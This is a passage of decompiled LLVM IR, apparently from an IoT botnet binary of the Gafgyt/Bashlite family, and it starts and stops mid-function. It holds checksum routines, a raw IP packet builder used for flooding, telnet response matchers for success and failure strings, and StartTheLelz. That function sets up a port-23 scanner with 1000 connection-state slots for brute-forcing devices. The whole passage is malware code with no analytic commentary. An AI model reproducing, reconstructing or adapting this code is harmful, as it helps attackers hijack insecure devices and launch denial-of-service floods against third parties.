  br i1 %v5_805b58142, label %dec_label_pc_805b561, label %dec_label_pc_805b583

dec_label_pc_805b561:                             ; preds = %entry, %dec_label_pc_805b561
  %stack_var_-24.046 = phi i16 [ %v9_805b572, %dec_label_pc_805b561 ], [ 0, %entry ]
  %stack_var_8.045 = phi i32 [ %v4_805b579, %dec_label_pc_805b561 ], [ %arg2, %entry ]
  %stack_var_4.044 = phi i16* [ %v23_805b575, %dec_label_pc_805b561 ], [ %arg1, %entry ]
  %v3_805b56f43 = phi i32 [ %v6_805b56f, %dec_label_pc_805b561 ], [ 0, %entry ]
  %v4_805b561 = ptrtoint i16* %stack_var_4.044 to i32
  %v2_805b564 = load i16, i16* %stack_var_4.044, align 2
  %v3_805b564 = zext i16 %v2_805b564 to i32
  %sext52 = mul i32 %v3_805b56f43, 65536
  %v4_805b56f = sdiv i32 %sext52, 65536
  %v6_805b56f = add nsw i32 %v3_805b564, %v4_805b56f
  %v11_805b56f = icmp ult i32 %v6_805b56f, %v4_805b56f
  %v26_805b56f = trunc i32 %v6_805b56f to i16
  %v7_805b572 = zext i1 %v11_805b56f to i16
  %v9_805b572 = add i16 %v7_805b572, %stack_var_-24.046
  %v5_805b575 = add i32 %v4_805b561, 2
  %v23_805b575 = inttoptr i32 %v5_805b575 to i16*
  %v4_805b579 = add i32 %stack_var_8.045, -2
  %v4_805b57d = add i32 %stack_var_8.045, -3
  %v9_805b57d = sub i32 2, %stack_var_8.045
  %v10_805b57d = and i32 %v4_805b579, %v9_805b57d
  %v11_805b57d = icmp slt i32 %v10_805b57d, 0
  %v12_805b57d = icmp eq i32 %v4_805b57d, 0
  %v13_805b57d = icmp slt i32 %v4_805b57d, 0
  %v3_805b581 = icmp eq i1 %v13_805b57d, %v11_805b57d
  %v4_805b581 = icmp eq i1 %v12_805b57d, false
  %v5_805b581 = and i1 %v4_805b581, %v3_805b581
  br i1 %v5_805b581, label %dec_label_pc_805b561, label %dec_label_pc_805b583

dec_label_pc_805b583:                             ; preds = %dec_label_pc_805b561, %entry
  %v3_805b56f.lcssa = phi i16 [ 0, %entry ], [ %v26_805b56f, %dec_label_pc_805b561 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_805b575, %dec_label_pc_805b561 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_805b579, %dec_label_pc_805b561 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_805b572, %dec_label_pc_805b561 ]
  %tmp19 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp19, label %dec_label_pc_805b5c4.preheader, label %dec_label_pc_805b589

dec_label_pc_805b589:                             ; preds = %dec_label_pc_805b583
  %v1_805b58c = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_805b58c = load i8, i8* %v1_805b58c, align 1
  %v3_805b58c = zext i8 %v2_805b58c to i32
  %v4_805b597 = sext i16 %v3_805b56f.lcssa to i32
  %v6_805b597 = add nsw i32 %v3_805b58c, %v4_805b597
  %v11_805b597 = icmp ult i32 %v6_805b597, %v4_805b597
  %v26_805b597 = trunc i32 %v6_805b597 to i16
  %v7_805b59a = zext i1 %v11_805b597 to i16
  %v9_805b59a = add i16 %v7_805b59a, %stack_var_-24.0.lcssa
  br label %dec_label_pc_805b5c4.preheader

dec_label_pc_805b5c4.preheader:                   ; preds = %dec_label_pc_805b589, %dec_label_pc_805b583
  %v3_805b5a9.ph = phi i16 [ %v3_805b56f.lcssa, %dec_label_pc_805b583 ], [ %v26_805b597, %dec_label_pc_805b589 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_805b583 ], [ %v9_805b59a, %dec_label_pc_805b589 ]
  %v4_805b5c421 = sext i16 %v3_805b5a9.ph to i32
  %v4_805b5c722 = sext i16 %stack_var_-24.1.ph to i32
  %v3_805b5ca23 = udiv i32 %v4_805b5c421, 65536
  %v4_805b5ca24 = mul i32 %v4_805b5c722, 65536
  %v5_805b5ca25 = or i32 %v4_805b5ca24, %v3_805b5ca23
  %v2_805b5ce26 = udiv i32 %v4_805b5c722, 65536
  %v2_805b5d127 = or i32 %v5_805b5ca25, %v2_805b5ce26
  %v3_805b5d128 = icmp eq i32 %v2_805b5d127, 0
  %v1_805b5d529 = icmp eq i1 %v3_805b5d128, false
  br i1 %v1_805b5d529, label %dec_label_pc_805b59f, label %dec_label_pc_805b5d7

dec_label_pc_805b59f:                             ; preds = %dec_label_pc_805b5c4.preheader, %dec_label_pc_805b59f
  %v2_805b5ce32 = phi i32 [ %v2_805b5ce, %dec_label_pc_805b59f ], [ %v2_805b5ce26, %dec_label_pc_805b5c4.preheader ]
  %v5_805b5ca31 = phi i32 [ %v5_805b5ca, %dec_label_pc_805b59f ], [ %v5_805b5ca25, %dec_label_pc_805b5c4.preheader ]
  %v4_805b5c430 = phi i32 [ %v4_805b5c4, %dec_label_pc_805b59f ], [ %v4_805b5c421, %dec_label_pc_805b5c4.preheader ]
  %v2_805b5ba = add i32 %v5_805b5ca31, %v4_805b5c430
  %v7_805b5ba = icmp ult i32 %v2_805b5ba, %v4_805b5c430
  %v3_805b5bc = zext i1 %v7_805b5ba to i32
  %v5_805b5bc = add nuw nsw i32 %v3_805b5bc, %v2_805b5ce32
  %sext = mul i32 %v2_805b5ba, 65536
  %v4_805b5c4 = sdiv i32 %sext, 65536
  %sext51 = mul i32 %v5_805b5bc, 65536
  %v4_805b5c7 = sdiv i32 %sext51, 65536
  %v3_805b5ca = udiv i32 %v4_805b5c4, 65536
  %v5_805b5ca = or i32 %sext51, %v3_805b5ca
  %v2_805b5ce = udiv i32 %v4_805b5c7, 65536
  %v2_805b5d1 = or i32 %v5_805b5ca, %v2_805b5ce
  %v3_805b5d1 = icmp eq i32 %v2_805b5d1, 0
  %v1_805b5d5 = icmp eq i1 %v3_805b5d1, false
  br i1 %v1_805b5d5, label %dec_label_pc_805b59f, label %dec_label_pc_805b5c4.dec_label_pc_805b5d7_crit_edge

dec_label_pc_805b5c4.dec_label_pc_805b5d7_crit_edge: ; preds = %dec_label_pc_805b59f
  br label %dec_label_pc_805b5d7

dec_label_pc_805b5d7:                             ; preds = %dec_label_pc_805b5c4.dec_label_pc_805b5d7_crit_edge, %dec_label_pc_805b5c4.preheader
  %v4_805b5c4.lcssa = phi i32 [ %v4_805b5c4, %dec_label_pc_805b5c4.dec_label_pc_805b5d7_crit_edge ], [ %v4_805b5c421, %dec_label_pc_805b5c4.preheader ]
  %v1_805b5db = urem i32 %v4_805b5c4.lcssa, 65536
  %v1_805b5dd = xor i32 %v1_805b5db, 65535
  store i32 %v0_805b54d, i32* @ebx, align 4
  ret i32 %v1_805b5dd

; uselistorder directives
  uselistorder i32 %v5_805b5ca, { 1, 0 }
  uselistorder i32 %v4_805b5c4, { 1, 0, 2 }
  uselistorder i32 %v2_805b5ce26, { 1, 0 }
  uselistorder i32 %v4_805b5c722, { 1, 0 }
  uselistorder i32 %v4_805b5c421, { 2, 1, 0 }
  uselistorder i32 %v4_805b597, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_805b56f.lcssa, { 1, 0 }
  uselistorder i32 %v4_805b57d, { 1, 0 }
  uselistorder i32 %v4_805b579, { 0, 2, 1 }
  uselistorder i32 %v6_805b56f, { 1, 2, 0 }
  uselistorder i32 %v4_805b56f, { 1, 0 }
  uselistorder label %dec_label_pc_805b59f, { 1, 0 }
  uselistorder label %dec_label_pc_805b561, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b5e8 = load i32, i32* @ebp, align 4
  store i32 %v0_805b5e8, i32* %stack_var_-4, align 4
  %v4_805b5e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805b5e8, i32* @ebp, align 4
  %v1_805b5fc = add i32 %tmp11, 12
  %v2_805b5fc = inttoptr i32 %v1_805b5fc to i32*
  %v3_805b5fc = load i32, i32* %v2_805b5fc, align 4
  store i32 %v3_805b5fc, i32* %stack_var_-32, align 4
  %v2_805b61a = call i32 @__GI_htons(i16 20)
  %v1_805b630 = call i32 @malloc(i32 32)
  %v4_805b643 = ptrtoint i32* %stack_var_-32 to i32
  %v3_805b64d = inttoptr i32 %v1_805b630 to i8*
  %v4_805b64d = call i32 @memcpy(i8* %v3_805b64d, i32 %v4_805b643, i32 12)
  %v1_805b655 = add i32 %v1_805b630, 12
  %v3_805b66a = inttoptr i32 %v1_805b655 to i8*
  %v4_805b66a = call i32 @memcpy(i8* %v3_805b66a, i32 %tmp1, i32 20)
  %v2_805b67c = inttoptr i32 %v1_805b630 to i16*
  %v3_805b67c = call i32 @csum(i16* %v2_805b67c, i32 32)
  %v1_805b68b = call i32 @free(i32 %v1_805b630)
  %v4_805b690 = urem i32 %v3_805b67c, 65536
  %v2_805b694 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b694, i32* @ebp, align 4
  ret i32 %v4_805b690

; uselistorder directives
  uselistorder i32 %v1_805b630, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b696 = load i32, i32* @ebp, align 4
  store i32 %v0_805b696, i32* %stack_var_-4, align 4
  %v4_805b69c = sext i8 %tmp8 to i32
  %v4_805b6a2 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_805b6c1 = add i32 %v4_805b6a2, 1
  %v2_805b6c1 = inttoptr i32 %v1_805b6c1 to i8*
  store i8 0, i8* %v2_805b6c1, align 1
  %v1_805b6c8 = add i32 %tmp5, 20
  %v1_805b6ce = trunc i32 %v1_805b6c8 to i16
  %v3_805b6ce = add i32 %v4_805b6a2, 2
  %v4_805b6ce = inttoptr i32 %v3_805b6ce to i16*
  store i16 %v1_805b6ce, i16* %v4_805b6ce, align 2
  %v2_805b6d2 = call i32 @rand_cmwc(i32 %v4_805b69c)
  %v1_805b6dc = trunc i32 %v2_805b6d2 to i16
  %v3_805b6dc = add i32 %v4_805b6a2, 4
  %v4_805b6dc = inttoptr i32 %v3_805b6dc to i16*
  store i16 %v1_805b6dc, i16* %v4_805b6dc, align 2
  %v1_805b6e3 = add i32 %v4_805b6a2, 6
  %v2_805b6e3 = inttoptr i32 %v1_805b6e3 to i16*
  store i16 0, i16* %v2_805b6e3, align 2
  %v1_805b6ec = add i32 %v4_805b6a2, 8
  %v2_805b6ec = inttoptr i32 %v1_805b6ec to i8*
  store i8 -1, i8* %v2_805b6ec, align 1
  %v3_805b6f7 = add i32 %v4_805b6a2, 9
  %v4_805b6f7 = inttoptr i32 %v3_805b6f7 to i8*
  store i8 %tmp8, i8* %v4_805b6f7, align 1
  %v1_805b6fd = add i32 %v4_805b6a2, 10
  %v2_805b6fd = inttoptr i32 %v1_805b6fd to i16*
  store i16 0, i16* %v2_805b6fd, align 2
  %v2_805b709 = add i32 %v4_805b6a2, 12
  %v3_805b709 = inttoptr i32 %v2_805b709 to i32*
  %v2_805b712 = add i32 %v4_805b6a2, 16
  %v3_805b712 = inttoptr i32 %v2_805b712 to i32*
  store i32 %tmp, i32* %v3_805b712, align 4
  %v2_805b715 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b715, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805b717 = load i32, i32* @ebp, align 4
  store i32 %v0_805b717, i32* %stack_var_-4, align 4
  %v4_805b71d = add i32 %arg1, -2
  %v9_805b71d = sub i32 1, %arg1
  %v10_805b71d = and i32 %v9_805b71d, %arg1
  %v11_805b71d = icmp slt i32 %v10_805b71d, 0
  %v12_805b71d = icmp eq i32 %v4_805b71d, 0
  %v13_805b71d = icmp slt i32 %v4_805b71d, 0
  %v3_805b721 = icmp eq i1 %v13_805b71d, %v11_805b71d
  %v4_805b721 = icmp eq i1 %v12_805b71d, false
  %v5_805b721 = and i1 %v4_805b721, %v3_805b721
  br i1 %v5_805b721, label %dec_label_pc_805b72c, label %dec_label_pc_805b73e

dec_label_pc_805b72c:                             ; preds = %entry
  store i32 %arg1, i32* @eax, align 4
  %v1_805b732 = call i32 @__GI___libc_close(i32 %arg1)
  %v2_805b741.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805b73e

dec_label_pc_805b73e:                             ; preds = %entry, %dec_label_pc_805b72c
  %v2_805b741 = phi i32 [ %v2_805b741.pre, %dec_label_pc_805b72c ], [ %v0_805b717, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_805b72c ], [ 1, %entry ]
  store i32 %v2_805b741, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_805b71d, { 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805b73e, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_805b743 = load i32, i32* @ebp, align 4
  %v1_805b74c = add i32 %tmp1, 4
  %v2_805b74c = inttoptr i32 %v1_805b74c to i32*
  %v3_805b74c = load i32, i32* %v2_805b74c, align 4
  %v1_805b758 = call i32 @__GI_inet_ntoa(i32 %v3_805b74c)
  store i32 %v0_805b743, i32* @ebp, align 4
  ret i32 %v1_805b758
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b75f = load i32, i32* @ebp, align 4
  store i32 %v0_805b75f, i32* %stack_var_-4, align 4
  %v4_805b75f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805b75f, i32* @ebp, align 4
  %v3_805b77a = inttoptr i32 %tmp6 to i8*
  %v4_805b77a = call i32 @__GI_memset(i8* %v3_805b77a, i32 0, i32 %tmp9)
  %v4_805b79a = call i32 @read_with_timeout(i32 %arg1, i32 %tmp4, i32 %tmp6, i32 %tmp9)
  %v2_805b7af = inttoptr i32 %tmp1 to i32*
  %v3_805b7af = call i32 @contains_string(i32 %tmp6, i32* %v2_805b7af)
  %v1_805b7b4 = icmp ne i32 %v3_805b7af, 0
  %. = zext i1 %v1_805b7b4 to i32
  %v2_805b7cb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b7cb, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b7d0 = load i32, i32* @edi, align 4
  store i32 %v0_805b7d0, i32* %stack_var_-8, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_805b7f4 = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i32 %v2_805b7f4, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805b7fb = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_805b808 = udiv i32 %arg1, 32
  %v1_805b80e = urem i32 %arg1, 32
  %v0_805b811 = load i32, i32* @ebp, align 4
  %v2_805b811 = mul nuw nsw i32 %v2_805b808, 4
  %v3_805b811 = add nsw i32 %v2_805b811, -140
  %v4_805b811 = add i32 %v3_805b811, %v0_805b811
  %v5_805b811 = inttoptr i32 %v4_805b811 to i32*
  %v6_805b811 = load i32, i32* %v5_805b811, align 4
  %v9_805b811 = shl i32 1, %v1_805b80e
  %v12_805b811 = or i32 %v6_805b811, %v9_805b811
  store i32 %v12_805b811, i32* %v5_805b811, align 4
  %v1_805b81c = add i32 %arg1, 1
  %v4_805b825 = ptrtoint i32* %stack_var_-152 to i32
  %v5_805b846 = call i32 @__libc_select(i32 %v1_805b81c, i32 %v2_805b7f4, i32 0, i32 0, i32 %v4_805b825)
  %tmp19 = icmp slt i32 %v5_805b846, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_805b85b, label %dec_label_pc_805b882

dec_label_pc_805b85b:                             ; preds = %entry
  %v4_805b877 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_805b882

dec_label_pc_805b882:                             ; preds = %entry, %dec_label_pc_805b85b
  %storemerge = phi i32 [ %v4_805b877, %dec_label_pc_805b85b ], [ 0, %entry ]
  %v2_805b88e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b88e, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805b882, { 1, 0 }
}

define i32 @contains_success() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b891 = load i32, i32* @ebp, align 4
  store i32 %v0_805b891, i32* %stack_var_-4, align 4
  %v4_805b891 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805b891, i32* @ebp, align 4
  %v4_805b8a5 = call i32 @contains_string(i32 %tmp, i32* bitcast ([3 x i8*]* @global_var_80718a0.1311 to i32*))
  %v2_805b8aa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b8aa, i32* @ebp, align 4
  ret i32 %v4_805b8a5

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b8ac = load i32, i32* @ebp, align 4
  store i32 %v0_805b8ac, i32* %stack_var_-4, align 4
  %v4_805b8ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805b8ac, i32* @ebp, align 4
  %v4_805b8c0 = call i32 @contains_string(i32 %tmp, i32* bitcast ([7 x i8*]* @global_var_8071880.1319 to i32*))
  %v2_805b8c5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b8c5, i32* @ebp, align 4
  ret i32 %v4_805b8c0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  br label %dec_label_pc_805b8e2

dec_label_pc_805b8e2:                             ; preds = %dec_label_pc_805b8e2, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_805b8e2, %dec_label_pc_805b8e2 ]
  %v4_805b8e2 = add i32 %stack_var_-12.0, 1
  %v2_805b8e9 = mul i32 %v4_805b8e2, 4
  %v5_805b8ec = add i32 %v2_805b8e9, %tmp5
  %v1_805b8ef = inttoptr i32 %v5_805b8ec to i32*
  %v2_805b8ef = load i32, i32* %v1_805b8ef, align 4
  %v1_805b8f1 = icmp eq i32 %v2_805b8ef, 0
  %v1_805b8f3 = icmp eq i1 %v1_805b8f1, false
  br i1 %v1_805b8f3, label %dec_label_pc_805b8e2, label %dec_label_pc_805b929.preheader

dec_label_pc_805b929.preheader:                   ; preds = %dec_label_pc_805b8e2
  %v2_805b913 = inttoptr i32 %arg1 to i8*
  %v5_805b92f16 = icmp sgt i32 %v4_805b8e2, 0
  br i1 %v5_805b92f16, label %dec_label_pc_805b8fe, label %dec_label_pc_805b938

dec_label_pc_805b8fe:                             ; preds = %dec_label_pc_805b929.preheader, %dec_label_pc_805b925
  %storemerge117 = phi i32 [ %v4_805b925, %dec_label_pc_805b925 ], [ 0, %dec_label_pc_805b929.preheader ]
  %v2_805b901 = mul i32 %storemerge117, 4
  %v5_805b904 = add i32 %v2_805b901, %tmp5
  %v1_805b907 = inttoptr i32 %v5_805b904 to i32*
  %v2_805b907 = load i32, i32* %v1_805b907, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_805b913 = call i32 @strcasestr(i8* %v2_805b913, i32 %v2_805b907)
  %v1_805b918 = icmp eq i32 %v3_805b913, 0
  br i1 %v1_805b918, label %dec_label_pc_805b925, label %dec_label_pc_805b938

dec_label_pc_805b925:                             ; preds = %dec_label_pc_805b8fe
  %v4_805b925 = add nuw nsw i32 %storemerge117, 1
  %v5_805b92f = icmp slt i32 %v4_805b925, %v4_805b8e2
  br i1 %v5_805b92f, label %dec_label_pc_805b8fe, label %dec_label_pc_805b938

dec_label_pc_805b938:                             ; preds = %dec_label_pc_805b8fe, %dec_label_pc_805b925, %dec_label_pc_805b929.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_805b929.preheader ], [ 0, %dec_label_pc_805b925 ], [ 1, %dec_label_pc_805b8fe ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_805b925, { 1, 0 }
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_805b8e2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805b938, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b8fe, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-336 = alloca i8*, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  store i32 1000, i32* %eax.global-to-local, align 4
  %v2_805b964 = call i32 @__GI_time(i32* null)
  store i32 %v2_805b964, i32* %eax.global-to-local, align 4
  store i32 %v2_805b964, i32* @ebx, align 4
  %v1_805b96b = call i32 @rand_cmwc(i32 0)
  %v1_805b970 = load i32, i32* @ebx, align 4
  %v2_805b970 = xor i32 %v1_805b970, %v1_805b96b
  store i32 %v2_805b970, i32* %eax.global-to-local, align 4
  %v1_805b975 = call i32 @srand(i32 %v2_805b970)
  store i32 %v1_805b975, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  %v2_805b98a = call i32 @__GI_htons(i16 23)
  %v2_805b9a6 = ptrtoint i32* %stack_var_-608 to i32
  %v15_805b9ac = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_805b9ac, i32* %eax.global-to-local, align 4
  %v3_805b9b2 = bitcast i32* %stack_var_-600 to i8*
  %v4_805b9b2 = call i32 @__GI_memset(i8* %v3_805b9b2, i32 0, i32 8)
  store i32 %v4_805b9b2, i32* %eax.global-to-local, align 4
  %v1_805b9be = call i32 @malloc(i32 32677)
  store i32 %v1_805b9be, i32* %eax.global-to-local, align 4
  %v3_805b9dc = inttoptr i32 %v1_805b9be to i8*
  %v4_805b9dc = call i32 @__GI_memset(i8* %v3_805b9dc, i32 0, i32 32677)
  %v0_805ba00 = load i32, i32* @esp, align 4
  %v1_805ba12 = add i32 %v0_805ba00, -27981
  %v2_805ba15 = and i32 %v1_805ba12, -16
  store i32 5000, i32* %eax.global-to-local, align 4
  store i32 %v2_805ba15, i32* %edx.global-to-local, align 4
  %v2_805ba37 = add i32 %v0_805ba00, -28008
  %v3_805ba37 = inttoptr i32 %v2_805ba37 to i32*
  store i32 5000, i32* %v3_805ba37, align 4
  %v0_805ba3b = load i32, i32* @esp, align 4
  %v1_805ba3b = add i32 %v0_805ba3b, 4
  %v2_805ba3b = inttoptr i32 %v1_805ba3b to i32*
  store i32 0, i32* %v2_805ba3b, align 4
  %v0_805ba43 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ba43 = load i32, i32* @esp, align 4
  %v2_805ba43 = inttoptr i32 %v1_805ba43 to i32*
  store i32 %v0_805ba43, i32* %v2_805ba43, align 4
  %v2_805ba46 = ptrtoint i8* %tmp10 to i32
  %v3_805ba46 = load i32, i32* %stack_var_-608, align 4
  %v4_805ba46 = inttoptr i32 %v2_805ba15 to i8*
  %v5_805ba46 = call i32 @__GI_memset(i8* %v4_805ba46, i32 %v2_805ba46, i32 %v3_805ba46)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805ba9b = or i32 %v2_805ba15, 9
  br label %dec_label_pc_805ba54

dec_label_pc_805ba54:                             ; preds = %entry, %dec_label_pc_805ba54
  %storemerge346 = phi i32 [ 0, %entry ], [ %v4_805bac0, %dec_label_pc_805ba54 ]
  %v1_805ba5a = mul nuw nsw i32 %storemerge346, 4
  store i32 %v1_805ba5a, i32* %edx.global-to-local, align 4
  %v2_805ba68 = mul nuw nsw i32 %storemerge346, 28
  %v2_805ba6a = add i32 %v2_805ba68, %v2_805ba15
  store i32 %v2_805ba6a, i32* %eax.global-to-local, align 4
  %v0_805ba6d = load i32, i32* @esp, align 4
  %v1_805ba6d = add i32 %v0_805ba6d, 8
  %v2_805ba6d = inttoptr i32 %v1_805ba6d to i32*
  store i32 28, i32* %v2_805ba6d, align 4
  %v0_805ba75 = load i32, i32* @esp, align 4
  %v1_805ba75 = add i32 %v0_805ba75, 4
  %v2_805ba75 = inttoptr i32 %v1_805ba75 to i32*
  store i32 0, i32* %v2_805ba75, align 4
  %v0_805ba7d = load i32, i32* %eax.global-to-local, align 4
  %v1_805ba7d = load i32, i32* @esp, align 4
  %v2_805ba7d = inttoptr i32 %v1_805ba7d to i32*
  store i32 %v0_805ba7d, i32* %v2_805ba7d, align 4
  %v3_805ba80 = inttoptr i32 %storemerge346 to i8*
  %v4_805ba80 = call i32 @__GI_memset(i8* %v3_805ba80, i32 %tmp, i32 ptrtoint (i32* @0 to i32))
  %v3_805ba9b = add i32 %v2_805ba9b, %v2_805ba68
  %v4_805ba9b = inttoptr i32 %v3_805ba9b to i8*
  store i8 1, i8* %v4_805ba9b, align 1
  %v1_805bab8 = add i32 %v2_805ba6a, 24
  store i32 %v1_805bab8, i32* %edx.global-to-local, align 4
  %v2_805babe = inttoptr i32 %v1_805bab8 to i32*
  store i32 %v1_805b9be, i32* %v2_805babe, align 4
  %v4_805bac0 = add nuw nsw i32 %storemerge346, 1
  store i32 %v4_805bac0, i32* %eax.global-to-local, align 4
  %v15_805bac7 = icmp eq i32 %v4_805bac0, 1000
  br i1 %v15_805bac7, label %dec_label_pc_805bacc.preheader, label %dec_label_pc_805ba54

dec_label_pc_805bacc.preheader:                   ; preds = %dec_label_pc_805ba54
  %v2_805bf2a = ptrtoint i32* %stack_var_-320 to i32
  %tmp33 = bitcast i32* %stack_var_-320 to i8*
  %v2_805bfaa = ptrtoint i32* %stack_var_-328 to i32
  %v2_805c010 = ptrtoint i32* %stack_var_-332 to i32
  %v2_805c01a = ptrtoint i8** %stack_var_-336 to i32
  %v2_805bb3c = or i32 %v2_805ba15, 8
  %v2_805bc60 = or i32 %v2_805ba15, 11
  %v2_805bc9b = or i32 %v2_805ba15, 10
  %v2_805c837 = add i32 %v2_805ba15, 16
  br label %dec_label_pc_805bacc

dec_label_pc_805bacc:                             ; preds = %dec_label_pc_805cc2b, %dec_label_pc_805bacc.preheader
  %stack_var_-24.0 = phi i32 [ %tmp7, %dec_label_pc_805bacc.preheader ], [ %stack_var_-24.1, %dec_label_pc_805cc2b ]
  %stack_var_-324.0 = phi i32 [ %tmp5, %dec_label_pc_805bacc.preheader ], [ %stack_var_-324.1, %dec_label_pc_805cc2b ]
  %stack_var_-604.0 = phi i32 [ %tmp8, %dec_label_pc_805bacc.preheader ], [ %stack_var_-604.1, %dec_label_pc_805cc2b ]
  br label %dec_label_pc_805bad8

dec_label_pc_805bad8:                             ; preds = %dec_label_pc_805bacc, %dec_label_pc_805cc2b
  %storemerge = phi i32 [ 0, %dec_label_pc_805bacc ], [ %v4_805cc2b, %dec_label_pc_805cc2b ]
  %storemerge44 = phi i32 [ 0, %dec_label_pc_805bacc ], [ %v4_805cc2b, %dec_label_pc_805cc2b ]
  %stack_var_-604.243 = phi i32 [ %stack_var_-604.0, %dec_label_pc_805bacc ], [ %stack_var_-604.1, %dec_label_pc_805cc2b ]
  %stack_var_-324.242 = phi i32 [ %stack_var_-324.0, %dec_label_pc_805bacc ], [ %stack_var_-324.1, %dec_label_pc_805cc2b ]
  %stack_var_-24.241 = phi i32 [ %stack_var_-24.0, %dec_label_pc_805bacc ], [ %stack_var_-24.1, %dec_label_pc_805cc2b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_805bade = mul nuw nsw i32 %storemerge44, 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  %v2_805baec = mul nuw nsw i32 %storemerge44, 28
